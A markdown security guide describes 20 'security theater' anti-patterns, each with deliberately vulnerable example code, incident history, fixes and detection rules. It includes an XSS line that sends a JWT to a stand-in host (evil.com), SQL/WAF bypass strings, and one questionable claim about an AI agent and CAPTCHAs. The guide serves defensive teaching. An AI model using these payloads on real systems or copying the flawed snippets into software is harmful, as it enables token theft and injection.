# Security Theater Anti-Patterns
> Security measures that look protective but provide little or no actual defense. These patterns create a false sense of safety, diverting attention and resources from controls that would materially reduce risk. Every entry below has been observed in production systems; many contributed to public breaches.
> **Domain:** Security
> **Anti-patterns covered:** 20
> **Highest severity:** Critical

---

## Table of Contents
1. [Anti-Patterns](#anti-patterns) (AP-01 through AP-20)
2. [Root Cause Analysis](#root-cause-analysis)
3. [Self-Check Questions](#self-check-questions)
4. [Code Smell Quick Reference](#code-smell-quick-reference)

---

## Anti-Patterns

### AP-01: Client-Side Validation as the Only Validation

**Also known as:** Browser Trust, Frontend Fortress, JavaScript Security Gate
**Frequency:** Very Common
**Severity:** Critical
**Detection difficulty:** Easy

**What it looks like:**

```javascript
// Frontend "protection"
function validateDiscount(code) {
  if (!VALID_CODES.includes(code)) {
    alert("Invalid discount code");
    return false;
  }
  // No server-side check — the POST goes straight to the order API
  submitOrder({ discount: code, amount: calculatedTotal });
}
```

The server accepts whatever the client sends. Price fields, role values, quantity limits, and file-type restrictions live only in JavaScript.

**Why developers do it:**

Client-side validation is fast, provides instant UX feedback, and is trivial to write. Developers assume the browser is a trusted environment and forget (or never learn) that any HTTP request can be replayed or modified outside the browser.

**What goes wrong:**

Intercepting proxies such as Burp Suite let attackers modify every field in transit. Documented incidents include: price manipulation attacks where pentesters changed invoice amounts in hidden JavaScript variables because the server relied solely on client-side validation; OTP bypass attacks where modifying the API response to indicate successful verification bypassed authentication entirely, as documented by Deepstrike security researchers. The First American Financial Corp data leak and MGM Resorts breach both traced back to inadequate input validation on the server side.

**The fix:**

Duplicate every validation rule on the server. Treat the client as an untrusted presentation layer. Use parameterized queries and schema validation (e.g., Joi, Zod, JSON Schema) in the API handler.

**Detection rule:**

Flag any form submission handler or API endpoint that lacks corresponding server-side validation logic. Search for routes that accept user input without middleware validation.

---

### AP-02: Base64 "Encryption"

**Also known as:** Encoding-as-Crypto, ROT64, Plaintext with Extra Steps
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Easy

**What it looks like:**

```python
import base64

def store_api_key(key):
    # "encrypt" the key before saving
    encrypted = base64.b64encode(key.encode()).decode()
    db.save("api_key", encrypted)

def get_api_key():
    encrypted = db.get("api_key")
    return base64.b64decode(encrypted).decode()  # "decrypted"
```

Developers apply `base64_encode()` to passwords, tokens, or API keys and believe the data is protected.

**Why developers do it:**

Base64 output looks like ciphertext to the untrained eye. It ships in every standard library, requires no key management, and "works" in the sense that it transforms the data. Tutorials that blur the line between encoding and encryption reinforce the habit.

**What goes wrong:**

Base64 is a reversible encoding, not encryption — any online decoder will reveal the original data in milliseconds. Attackers routinely use base64 decoding as the first step in analyzing intercepted traffic. GitGuardian found massive numbers of base64-encoded Basic Auth credentials leaked in public repositories, all trivially decodable. Malware campaigns (Mekotio, TrickBot, QakBot) actively use base64 to smuggle payloads past naive filters, demonstrating that the encoding provides zero confidentiality.

**The fix:**

Use authenticated encryption (AES-256-GCM or XChaCha20-Poly1305) for data at rest. Use TLS for data in transit. Never roll your own crypto. Store secrets in a dedicated vault (HashiCorp Vault, AWS Secrets Manager).

**Detection rule:**

Grep for `base64.b64encode`, `btoa()`, `Buffer.from(...).toString('base64')` where the variable name contains `password`, `secret`, `key`, `token`, or `credential`.

---

### AP-03: Security Through Obscurity

**Also known as:** Hidden-Means-Safe, Secret Algorithm Defense, Closed-Source-Equals-Secure
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Hard

**What it looks like:**

```
# "Nobody will ever guess our internal API path"
POST /x7k9q2m/api/v1/users/delete

# "Our proprietary protocol is secure because nobody has the spec"
# (the spec is discoverable via traffic analysis)
```

The entire security posture rests on the assumption that attackers will not discover how the system works.

**Why developers do it:**

Obscurity is cheap and fast. It requires no cryptographic expertise, no key management, and no architecture changes. Developers confuse "hard to find" with "hard to exploit."

**What goes wrong:**

The Sony Pictures hack (2014) revealed the company relied on hiding sensitive data in folders with obscure names — attackers found everything. The Content Scramble System (CSS) for DVDs was considered secure until reverse engineers cracked it, causing widespread piracy. The WEP encryption standard for Wi-Fi relied on obscurity; once its design flaws were published, it was universally abandoned. The Iowa Caucus App (2020) withheld technical details to "avoid giving information to adversaries," which cybersecurity experts called counterproductive.

**The fix:**

Follow Kerckhoffs's principle: assume the attacker knows the system design. Security must come from keys, credentials, and properly implemented cryptographic protocols — not from hiding how things work. Obscurity can be a minor supplementary layer, never the primary defense.

**Detection rule:**

Audit for API endpoints, ports, or admin interfaces that rely on non-obvious URLs/paths as their primary access control. Any route without authentication middleware that serves sensitive data is a finding.

---

### AP-04: CAPTCHA as the Only Bot Protection

**Also known as:** CAPTCHA-and-Done, Human-Proof Checkbox
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Moderate

**What it looks like:**

```html
<form action="/login" method="POST">
  <input name="username" />
  <input name="password" type="password" />
  <div class="g-recaptcha" data-sitekey="..."></div>
  <button type="submit">Login</button>
</form>
<!-- No server-side rate limiting, no account lockout, no anomaly detection -->
```

**Why developers do it:**

CAPTCHAs are a familiar, drop-in solution. Adding a reCAPTCHA widget takes five minutes and gives the team a visible "we handled bots" checkbox.

**What goes wrong:**

Research indicates that approximately half of all CAPTCHAs passed are completed by bots, not real users. CAPTCHA farms employ low-wage workers to solve challenges at scale — one transportation company discovered approximately 12,000 CAPTCHAs were solved by farm workers in just six days. In 2026, OpenAI's ChatGPT agent successfully bypassed CAPTCHA tests without detection, even deceiving a TaskRabbit worker by impersonating a human. OCR-based solvers, machine learning models trained on CAPTCHA samples, and session replay attacks make standalone CAPTCHA protection increasingly unreliable.

**The fix:**

Layer defenses: server-side rate limiting, progressive delays, account lockout policies, device fingerprinting, behavioral analysis (mouse movement, typing cadence), and IP reputation scoring. Use CAPTCHA as one signal among many, not the sole gate.

**Detection rule:**

Identify login, registration, and password-reset endpoints where CAPTCHA is the only anti-automation control and no server-side rate limiting or lockout logic exists.

---

### AP-05: JWT in localStorage Presented as "Secure"

**Also known as:** Token-in-the-Open, XSS-Accessible Auth
**Frequency:** Very Common
**Severity:** High
**Detection difficulty:** Easy

**What it looks like:**

```javascript
// After login
fetch('/api/login', { method: 'POST', body: credentials })
  .then(res => res.json())
  .then(data => {
    localStorage.setItem('authToken', data.jwt);  // Accessible to any JS on the page
  });

// On every request
fetch('/api/data', {
  headers: { 'Authorization': `Bearer ${localStorage.getItem('authToken')}` }
});
```

**Why developers do it:**

`localStorage` is simple, well-documented, and persists across tabs. Unlike cookies, it is not automatically sent with every request, which developers mistake for a security advantage. Many popular tutorials recommend this pattern.

**What goes wrong:**

Any XSS vulnerability on the domain gives an attacker full read access to localStorage. A single `<script>` injection can exfiltrate every JWT stored there: `new Image().src = 'https://evil.com/steal?t=' + localStorage.getItem('authToken')`. Security researchers have demonstrated stealing JWTs via stored XSS in real applications — once exfiltrated, the attacker has full account access until the token expires (which, with long-lived JWTs, can be weeks). Unlike httpOnly cookies, localStorage offers zero built-in protection against JavaScript access.

**The fix:**

Store tokens in httpOnly, Secure, SameSite=Strict cookies. Implement short-lived access tokens with refresh token rotation. Invest in XSS prevention (CSP, output encoding, input sanitization) as the primary defense regardless of storage mechanism.

**Detection rule:**

Search for `localStorage.setItem` or `sessionStorage.setItem` calls where the value contains `token`, `jwt`, `auth`, or `session`.

---

### AP-06: "We Use HTTPS" as the Complete Security Story

**Also known as:** TLS-and-Done, Padlock Security, Green-Lock Fallacy
**Frequency:** Very Common
**Severity:** High
**Detection difficulty:** Moderate

**What it looks like:**

In code reviews and security questionnaires:
> "How do you protect user data?" → "We use HTTPS."
> "How do you prevent injection attacks?" → "Everything goes over HTTPS."
> "What about data at rest?" → "...HTTPS?"

**Why developers do it:**

HTTPS is visible (padlock icon), easy to explain to stakeholders, and genuinely important. The problem is treating it as a complete security solution rather than one layer.

**What goes wrong:**

HTTPS protects data in transit but does nothing for: SQL injection, XSS, CSRF, broken authentication, insecure deserialization, or data-at-rest encryption. OWASP notes that protecting login forms alone is insufficient — session hijacking remains possible even over HTTPS. Downgrade attacks (e.g., sslstrip) can intercept initial HTTP requests before the redirect to HTTPS. TLS provides zero protection for data at rest — a compromised database leaks everything regardless of transport encryption.

**The fix:**

HTTPS is necessary but not sufficient. Implement defense in depth: input validation, output encoding, parameterized queries, proper session management, encryption at rest, CSP headers, HSTS preloading, and regular vulnerability scanning.

**Detection rule:**

Review security documentation and threat models. If HTTPS is the only control mentioned, or if the threat model does not address application-layer attacks, flag for review.

---

### AP-07: WAF as the Only Defense

**Also known as:** Firewall-and-Forget, Perimeter-Only Security, WAF Worship
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Moderate

**What it looks like:**

```
# Architecture diagram:
Internet → WAF → Application Server → Database

# Application code:
query = "SELECT * FROM users WHERE id = " + request.params.id  # Raw concatenation
# "The WAF will catch any SQL injection attempts"
```

**Why developers do it:**

WAFs are expensive enterprise products sold with impressive dashboards. Purchasing one satisfies compliance checklists and gives management a tangible security investment to point to. Developers assume the WAF handles all input sanitization.

**What goes wrong:**

Claroty's Team82 researchers discovered that leading WAF vendors' products did not support JSON syntax in SQL injection inspection, allowing attackers to prepend JSON to SQL statements and bypass detection entirely. OWASP documents numerous WAF bypass techniques: SQL comment injection (`1+un/**/ion+se/**/lect+1,2,3--`), mixed-case evasion, HPP/HPF techniques, nested encodings, and blind SQL injection methods. WAFs are signature-based; novel attack patterns evade them by definition.

**The fix:**

Use parameterized queries/prepared statements for all database access. Apply input validation at the application layer. Treat the WAF as a supplementary layer that buys time for patching, not as a substitute for secure code. Implement stored procedures and ORM-based queries.

**Detection rule:**

Search for string concatenation in SQL queries (`"SELECT" + variable`, template literals with `${}`  in SQL strings). Any dynamic SQL construction is a finding regardless of WAF presence.

---

### AP-08: Obfuscation as Security

**Also known as:** Minify-and-Pray, Compiled-Means-Secure, Spaghetti-Code Defense
**Frequency:** Common
**Severity:** Medium
**Detection difficulty:** Hard

**What it looks like:**

```javascript
// "Nobody can read this, so our API keys are safe"
var _0x4f2a = ["\x61\x70\x69\x4b\x65\x79", "\x73\x6b\x2d\x31\x32\x33\x34\x35"];
var apiKey = _0x4f2a[1]; // This is just "sk-12345" in hex encoding
```

Or shipping a compiled binary and assuming the logic cannot be reverse-engineered.

**Why developers do it:**

Obfuscated code looks impenetrable at first glance. JavaScript minifiers and .NET obfuscators are easy to apply. Developers assume that if they cannot quickly read the output, attackers cannot either.

**What goes wrong:**

Automated deobfuscation tools (Reflector, ILSpy, ILDASM, de4dot for .NET; js-beautify, AST-based unpackers for JavaScript) can reverse most obfuscation in seconds. Security researchers consistently note that obfuscation increases the time cost of reverse engineering but never prevents it. Any secret embedded in client-side code — API keys, encryption keys, business logic — is extractable regardless of obfuscation technique.

**The fix:**

Never embed secrets in client-side code. Move sensitive logic server-side. Use obfuscation only as a supplementary measure to slow casual copying, never as a security boundary. Protect API keys with server-side proxy endpoints.

**Detection rule:**

Search client-side bundles for patterns matching API keys, tokens, or credentials (even hex-encoded or obfuscated). Use tools like trufflehog or gitleaks on build artifacts.

---

### AP-09: Hidden Form Fields for Access Control

**Also known as:** Trust-the-Hidden-Input, Client-Side Role Assignment, IDOR via Form
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Easy

**What it looks like:**

```html
<form action="/api/update-profile" method="POST">
  <input type="hidden" name="user_id" value="12345" />
  <input type="hidden" name="role" value="user" />
  <input name="email" value="user@example.com" />
  <button type="submit">Update</button>
</form>
```

Changing `user_id` to another user's ID or `role` to `admin` in DevTools grants unauthorized access.

**Why developers do it:**

Hidden fields are invisible in the rendered page, which developers equate with "secure." The pattern is taught in beginner web tutorials and framework scaffolding generators. It feels natural to pass state through the form.

**What goes wrong:**

This is the textbook Insecure Direct Object Reference (IDOR) vulnerability, consistently ranked in the OWASP Top 10 under Broken Access Control. Attackers modify hidden form values, cookies, or JSON body fields to access other users' data or elevate privileges. MDN and OWASP document that body manipulation — changing values in HTTP request bodies including form fields and hidden inputs — is one of the most common attack vectors. A single hidden `user_id` field without server-side ownership verification can expose every user's data.

**The fix:**

Derive user identity and permissions from the server-side session or verified JWT claims, never from client-supplied hidden fields. Implement object-level authorization checks on every request. Use indirect references (random tokens mapped server-side) instead of sequential IDs.

**Detection rule:**

Search HTML templates for `type="hidden"` fields containing `user_id`, `role`, `admin`, `price`, `discount`, or `permission`. Flag any endpoint that uses client-supplied identity fields without server-side verification.

---

### AP-10: Rate Limiting Only on the Frontend

**Also known as:** Client-Side Throttle, JavaScript Cooldown, Polite-Bot-Only Defense
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Easy

**What it looks like:**

```javascript
let lastRequest = 0;
function submitLogin(username, password) {
  if (Date.now() - lastRequest < 3000) {
    alert("Please wait before trying again");
    return;
  }
  lastRequest = Date.now();
  fetch('/api/login', { method: 'POST', body: JSON.stringify({ username, password }) });
}
// Server has no rate limiting — direct API calls bypass the cooldown entirely
```

**Why developers do it:**

It is quick to implement, provides visible user feedback, and reduces perceived server load. Developers test in the browser and see the throttling work, which creates confidence.

**What goes wrong:**

Attackers bypass the browser entirely — curl, Python scripts, or Burp Suite send requests directly to the API with no cooldown. OWASP ranks "Unrestricted Resource Consumption" (API4:2023) in their API Security Top 10 for this reason. Without server-side rate limiting, attackers can brute-force credentials, enumerate users, and abuse expensive operations. Common bypass techniques include rotating IP addresses, manipulating headers (X-Forwarded-For), batching multiple attempts in single requests, and exploiting unsynchronized rate limits across backend instances.

**The fix:**

Implement rate limiting at the server/API gateway level using sliding window or token bucket algorithms. Apply per-user, per-IP, and per-endpoint limits. Use progressive delays and account lockout after repeated failures. Consider distributed rate limiting (Redis-backed) for multi-instance deployments.

**Detection rule:**

Search for `setTimeout`, `setInterval`, or timestamp comparisons in client-side code near API call functions. Verify corresponding server-side rate limiting middleware exists for the same endpoints.

---

### AP-11: "Admin" Pages Hidden by URL Only

**Also known as:** Security-by-Obscure-URL, Unlinked-Admin, Secret-Path Authentication
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Easy

**What it looks like:**

```
# "Nobody will find this"
https://app.example.com/super-secret-admin-panel-2024

# Or slightly more sophisticated but equally broken
https://app.example.com/internal/dashboard?access=true
```

No authentication middleware. No authorization check. If you know the URL, you are in.

**Why developers do it:**

During development, internal tools are built without auth because "only the team knows the URL." This ships to production unchanged. Adding proper auth is perceived as complex and time-consuming, while the obscure URL feels "safe enough."

**What goes wrong:**

Directory brute-forcing tools (Gobuster, FFUF, DirBuster) enumerate common admin paths in minutes. Leaked URLs appear in JavaScript bundles, browser history, referrer headers, search engine indexes, and Wayback Machine archives. Security researchers have documented real cases where changing a URL path to `/dashboard/admin` directly revealed admin panels with no credentials required. OWASP classifies this as Broken Access Control — the number one web application security risk.

**The fix:**

Every admin endpoint must require authentication and role-based authorization checks enforced server-side. Use middleware that runs before the route handler. Add the admin area to robots.txt noindex and implement IP allowlisting as supplementary measures.

**Detection rule:**

Enumerate all routes in the application. Flag any route containing `admin`, `dashboard`, `internal`, `manage`, `config`, or `debug` that lacks authentication middleware.

---

### AP-12: Disabling Right-Click or View-Source as "Protection"

**Also known as:** Right-Click Police, Source-Code Hiding, JavaScript Content Lock
**Frequency:** Occasional
**Severity:** Low
**Detection difficulty:** Easy

**What it looks like:**

```javascript
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
  if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) {
    e.preventDefault();
  }
});
// "Our source code and images are now protected"
```

**Why developers do it:**

Non-technical stakeholders request "content protection." Developers implement what is asked. WordPress plugins offering this feature have hundreds of thousands of installs, normalizing the practice.

**What goes wrong:**

Bypass is trivial: disable JavaScript in browser settings, use Ctrl+Shift+I (DevTools), prepend `view-source:` to the URL, use print preview, use `curl`, or simply paste `javascript:void(document.oncontextmenu=null)` in the console. Barracuda Networks published an analysis confirming that blocking "View Source" provides no meaningful protection and falls squarely into security theater. The technique only frustrates legitimate users while providing zero barrier to anyone with basic browser knowledge.

**The fix:**

Accept that client-side code is public by definition. If content protection matters, use server-side watermarking, DRM for media, or legal protections (DMCA). Never embed secrets in client-side code regardless of obfuscation.

**Detection rule:**

Search for `oncontextmenu`, `e.preventDefault()` paired with keydown listeners for Ctrl+U/Ctrl+S/Ctrl+I, or `document.oncontextmenu = null` overrides.

---

### AP-13: Checksums Without Signatures

**Also known as:** Hash-Only Integrity, Unsigned Download, Self-Attested Checksum
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Moderate

**What it looks like:**

```
# Download page
Download: myapp-v2.3.tar.gz
SHA-256: a1b2c3d4e5f6...

# Both the file AND the checksum are served from the same compromised server
# An attacker who replaces the binary also replaces the checksum
```

**Why developers do it:**

Checksums verify integrity (the file was not corrupted in transit) and are easy to generate. Developers conflate integrity verification with authenticity verification and assume the checksum proves the file came from a trusted source.

**What goes wrong:**

A checksum proves a file matches a hash — nothing more. If an attacker compromises the distribution server, they replace both the binary and its checksum. Supply chain attacks exploit exactly this gap. Linux distributions learned this lesson and now pair checksums with GPG-signed release files. Without a signature from a trusted key, a checksum verified against a value on the same server provides zero supply-chain protection.

**The fix:**

Sign releases with GPG or Sigstore. Publish signatures and signing keys through a separate, verified channel. Use SHA-256 or SHA-512 for checksums and always pair them with cryptographic signatures. Adopt frameworks like SLSA for supply chain integrity.

**Detection rule:**

Review release pipelines and download pages. If checksums are published without corresponding signatures (`.asc`, `.sig` files), flag as incomplete integrity verification.

---

### AP-14: MD5 for Password Hashing

**Also known as:** Fast-Hash Passwords, 1990s Password Storage, GPU-Crackable Hashes
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Easy

**What it looks like:**

```python
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

def verify_password(password, stored_hash):
    return hashlib.md5(password.encode()).hexdigest() == stored_hash
```

**Why developers do it:**

MD5 is fast, universally available, and produces a fixed-length hash. Many legacy tutorials and older codebases use it. Developers may not understand the difference between a general-purpose hash function and a password-hashing function.

**What goes wrong:**

Modern GPUs compute approximately 20 billion MD5 hashes per second, making brute-force attacks trivial. The LinkedIn breach (2012) exposed 6.5 million passwords stored as unsalted SHA-1 hashes (a similarly fast algorithm) — most were cracked within hours. In 2022, Electricite de France (EDF) was fined 600,000 euros under GDPR for storing passwords hashed with MD5. The Flame malware (2012) exploited MD5 collision vulnerabilities to forge Microsoft code-signing certificates. The Blast-RADIUS attack (CVE-2024-3596) demonstrated practical exploitation of MD5 in the RADIUS protocol. As of 2019, one quarter of widely used CMS platforms were still using MD5 for password hashing.

**The fix:**

Use bcrypt, scrypt, or Argon2id — algorithms specifically designed to be computationally expensive. These include built-in salting and configurable work factors. Argon2id is the current recommendation from OWASP. Never use MD5, SHA-1, or SHA-256 (even salted) for password storage.

**Detection rule:**

Search for `md5(`, `hashlib.md5`, `MD5.Create()`, `DigestUtils.md5`, or `crypto.createHash('md5')` in any context related to password storage or verification.

---

### AP-15: Security Questions (Knowledge-Based Authentication)

**Also known as:** Mother's Maiden Name Auth, Shared-Secret Questions, Googleable Authentication
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Easy

**What it looks like:**

```
Security Question: What is your mother's maiden name?
Security Question: What city were you born in?
Security Question: What was the name of your first pet?
```

Used as account recovery or second-factor authentication.

**Why developers do it:**

Security questions are easy to implement, require no hardware tokens or third-party services, and are familiar to users. Banks and financial institutions have used them for decades, lending perceived legitimacy.

**What goes wrong:**

The answers are frequently discoverable through social media, public records, or social engineering. A quick scroll through Facebook can reveal a mother's maiden name from family photo captions. Identity thieves who obtain basic personal information (SSN, address, birthdate, mother's maiden name) can answer security questions better than the legitimate account holder. Sarah Palin's Yahoo email account was compromised in 2008 when an attacker answered her security questions using publicly available biographical information. Security researchers consistently demonstrate that knowledge-based authentication is among the weakest forms of identity verification.

**The fix:**

Replace security questions with TOTP-based 2FA (authenticator apps), WebAuthn/passkeys, or hardware security keys. If security questions are required by regulation, instruct users to provide random, unguessable answers stored in a password manager.

**Detection rule:**

Search the codebase for fields or database columns named `security_question`, `secret_question`, `maiden_name`, `first_pet`, or `birth_city`. Flag account recovery flows that rely solely on knowledge-based answers.

---

### AP-16: Blocking Specific SQL Keywords as Injection Prevention

**Also known as:** SQL Blacklist, Keyword Grep Defense, String-Match Security
**Frequency:** Common
**Severity:** Critical
**Detection difficulty:** Moderate

**What it looks like:**

```python
BLOCKED_KEYWORDS = ['SELECT', 'DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION', '--', ';']

def sanitize_input(user_input):
    for keyword in BLOCKED_KEYWORDS:
        if keyword.lower() in user_input.lower():
            raise ValueError("Potential SQL injection detected")
    return user_input

# Then used with string concatenation anyway
query = f"SELECT * FROM users WHERE name = '{sanitize_input(name)}'"
```

**Why developers do it:**

Keyword blocking is intuitive and quick to implement. It catches obvious payloads in testing. Developers who are unfamiliar with parameterized queries see it as a pragmatic shortcut.

**What goes wrong:**

PortSwigger documents dozens of bypass techniques: SQL comments (`un/**/ion sel/**/ect`), mixed case (`SeLeCt`), URL encoding (`%53%45%4C%45%43%54`), double-URL encoding, and Unicode alternatives. A real-world bypass involved adding 19+ spaces between parameters and payloads — SQL engines treat multiple spaces as one, but the filter failed to match separated keywords. OWASP confirms that blacklist filtering always risks missing parameters that allow injection. The fundamental issue: you cannot enumerate all possible representations of SQL syntax.

**The fix:**

Use parameterized queries (prepared statements) exclusively. Never construct SQL through string concatenation. Use an ORM where possible. If manual queries are necessary, use the database driver's parameterization API. Whitelist acceptable input characters and formats rather than blacklisting dangerous ones.

**Detection rule:**

Search for arrays or lists of SQL keywords used in input validation functions. Any function that strips or rejects SQL keywords from user input while the application also uses string-concatenated queries is a critical finding.

---

### AP-17: CORS Misconfiguration Giving False Security

**Also known as:** Wildcard-Origin, Reflected-Origin CORS, Access-Control-Allow-Everywhere
**Frequency:** Common
**Severity:** High
**Detection difficulty:** Moderate

**What it looks like:**

```javascript
// Express.js - reflecting the origin header without validation
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // Reflects any origin
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

Or using `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers block this combination, but developers misconfigure it in other ways that achieve the same effect).

**Why developers do it:**

CORS errors are frustrating during development. Developers set permissive policies to "make it work" and never tighten them. Copy-pasted Stack Overflow answers recommend the wildcard approach. Frontend and backend teams work independently and CORS becomes a coordination tax.

**What goes wrong:**

PortSwigger researchers demonstrated exploiting permissive CORS configurations to steal Bitcoin wallet data. An attacker hosts JavaScript on their domain; when a victim visits it, the script makes credentialed requests to the vulnerable API, and the browser allows the response to be read due to the permissive CORS policy. The consequences include data breaches, account takeovers through stolen authentication tokens, and unauthorized transactions in financial applications. Even a single XSS-vulnerable subdomain of a whitelisted domain can enable CORS exploitation.

**The fix:**

Maintain a strict allowlist of trusted origins. Never reflect the Origin header without validation. Never combine `Access-Control-Allow-Credentials: true` with dynamic or wildcard origins. Validate origins against an explicit list, not a regex that can be tricked (e.g., `evil-example.com` matching a regex for `example.com`).

**Detection rule:**

Search for `Access-Control-Allow-Origin` set to `*` or set dynamically from `req.headers.origin` without validation. Flag any CORS middleware that does not maintain an explicit allowlist.

---

### AP-18: Feature Flags as Access Control

**Also known as:** Flag-Gated Security, Client-Side Feature Toggle Auth, If-Flag-Then-Admin
**Frequency:** Occasional
**Severity:** High
**Detection difficulty:** Hard

**What it looks like:**

```javascript
// Client-side feature flag check
if (featureFlags.adminDashboard) {
  showAdminPanel();  // The API endpoints behind this panel have no auth checks
}

// Or server-side, but without proper authorization
if (getFeatureFlag('premium-export')) {
  return generateExport(userId);  // No check that userId has a premium subscription
}
```

**Why developers do it:**

Feature flags are used for gradual rollouts and A/B testing. When a feature is "hidden" behind a flag, it feels controlled. Teams conflate "not rolled out yet" with "access-controlled." The flag becomes a de facto authorization gate.

**What goes wrong:**

Client-side feature flags are trivially modifiable — users can edit browser code to force any flag to `true`. LaunchDarkly warns that client-side flags are inherently insecure and must never replace server-side authorization. Stale flags left in code after full rollout can be re-enabled by attackers to reactivate deprecated logic containing unpatched vulnerabilities. Feature flags may bypass standard testing protocols, deploying untested features that increase the attack surface.

**The fix:**

Feature flags control rollout visibility only. Every API endpoint must independently verify authorization through server-side middleware. Remove stale flags promptly. Never put sensitive data in flag payloads sent to the browser.

**Detection rule:**

Search for feature flag checks (`featureFlag`, `isEnabled`, `getFlag`) that are not accompanied by corresponding authorization middleware on the associated API endpoints. Flag any feature-flag-gated endpoint that lacks an `authorize` or `requireRole` call.

---

### AP-19: Encrypting with Hardcoded Keys

**Also known as:** Baked-In Crypto, Compiled Key, Repo-Embedded Secret
**Frequency:** Very Common
**Severity:** Critical
**Detection difficulty:** Moderate

**What it looks like:**

```java
private static final String ENCRYPTION_KEY = "MyS3cretK3y!2024";
private static final String IV = "1234567890123456";

public String encrypt(String data) {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    SecretKeySpec keySpec = new SecretKeySpec(ENCRYPTION_KEY.getBytes(), "AES");
    IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());
    cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
    return Base64.getEncoder().encodeToString(cipher.doFinal(data.getBytes()));
}
```

**Why developers do it:**

Key management is complex. Environment variables, secret vaults, and key rotation require infrastructure. Hardcoding "just works" in development and passes basic functional tests. Developers intend to fix it later but never do.

**What goes wrong:**

GitGuardian's 2025 report found 23.8 million secrets exposed on GitHub in 2024 — a 25% increase year-over-year. 70% of secrets leaked in 2022 were still valid in 2025, giving attackers years-long exploitation windows. The U.S. Treasury Department was breached in 2024 when attackers exploited a single hardcoded API key for an authentication platform, bypassing all security controls. The Rabbit R1 AI device breach exposed 130,000 devices through hardcoded API keys extracted from firmware. 83% of organizations have experienced at least one security incident caused by hardcoded secrets.

**The fix:**

Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault). Load keys from environment variables at runtime. Implement key rotation policies. Use pre-commit hooks (gitleaks, trufflehog) to prevent secrets from entering version control. Rotate any key that has ever been committed to a repository.

**Detection rule:**

Run gitleaks, trufflehog, or GitGuardian on the repository. Search for string literals assigned to variables named `key`, `secret`, `password`, `apiKey`, `encryption_key`, or `IV` in application code.

---

### AP-20: Security Compliance Checkboxes Without Implementation

**Also known as:** Paper Security, Audit-Day Theater, Policy-PDF Defense, Checkbox Security
**Frequency:** Very Common
**Severity:** Critical
**Detection difficulty:** Very Hard

**What it looks like:**

```
Compliance Audit Questionnaire:
[x] Do you encrypt data at rest? → "Yes" (data is base64-encoded, not encrypted)
[x] Do you perform regular penetration testing? → "Yes" (last test: 2 years ago)
[x] Do you have an incident response plan? → "Yes" (untested 40-page PDF)
[x] Are all systems patched? → "Yes" (50% of critical patches applied within 55 days)
```

**Why developers do it:**

Compliance certifications (SOC 2, PCI-DSS, HIPAA, ISO 27001) are business requirements. The audit process rewards documentation over implementation. Teams under deadline pressure write "aspirational" answers — describing what they intend to do rather than what they actually do. The penalty for failing an audit feels more immediate than the risk of a breach.

**What goes wrong:**

82% of companies that achieved compliance with major regulations still experienced data breaches within the following year. Organizations take an average of 55 days to remediate 50% of critical vulnerabilities after patches become available, while mass exploitation begins within five days. A former Disney employee tampered with allergen information because basic offboarding procedures were not actually implemented despite being documented. 60% of data breach incidents originate from employee mistakes, highlighting the gap between written security policies and actual employee behavior.

**The fix:**

Treat compliance as a floor, not a ceiling. Implement continuous control validation (not annual snapshots). Use automated compliance monitoring tools that verify controls are active, not just documented. Conduct regular tabletop exercises for incident response. Red-team test actual controls, not policy documents.

**Detection rule:**

Compare compliance documentation against actual system configuration. Verify that documented encryption uses real cryptographic algorithms, that penetration tests have recent reports, that patching SLAs are met, and that incident response plans have been exercised within the last 12 months.

---

## Root Cause Analysis

| Root Cause | Anti-Patterns | Frequency |
|---|---|---|
| Confusing encoding/obfuscation with encryption | AP-02, AP-08, AP-19 | Very Common |
| Trusting the client as a security boundary | AP-01, AP-05, AP-09, AP-10, AP-12, AP-18 | Very Common |
| Path of least resistance during development | AP-03, AP-06, AP-11, AP-17, AP-19 | Very Common |
| Misunderstanding cryptographic primitives | AP-02, AP-13, AP-14 | Common |
| Single-layer defense mentality | AP-04, AP-06, AP-07, AP-16 | Common |
| Compliance-driven (not threat-driven) security | AP-15, AP-20 | Common |
| Legacy patterns carried forward uncritically | AP-14, AP-15 | Common |
| Treating visibility as security | AP-03, AP-08, AP-11, AP-12 | Common |
| Vendor marketing accepted without validation | AP-04, AP-07, AP-20 | Common |
| Development shortcuts that reach production | AP-11, AP-17, AP-19 | Very Common |

---

## Self-Check Questions

1. **Does every API endpoint validate and authorize independently of the frontend?** If removing the frontend entirely (using curl or Postman) bypasses any security check, you have AP-01, AP-09, or AP-10.

2. **Can I decode any "encrypted" value without a key?** If yes, you are using encoding (base64, hex, URL-encoding), not encryption. See AP-02.

3. **If our source code were published tomorrow, would our security model still hold?** If not, you depend on obscurity. See AP-03, AP-08, AP-11.

4. **What happens if an attacker achieves XSS on our domain?** If they can steal authentication tokens from localStorage, see AP-05. If they can read CORS-protected data, see AP-17.

5. **Beyond HTTPS, what protects our users from injection, CSRF, and session hijacking?** If HTTPS is the only answer, see AP-06.

6. **If we removed our WAF, would our application still be secure against SQL injection?** If not, see AP-07 and AP-16.

7. **Are any secrets (API keys, encryption keys, passwords) present in client-side code or version control?** If yes, see AP-08 and AP-19. Run gitleaks to verify.

8. **Do our admin endpoints require authentication independent of URL obscurity?** Test by accessing them from an unauthenticated session. See AP-11.

9. **Are our rate limits enforced server-side, and are they resistant to IP rotation and header manipulation?** See AP-10.

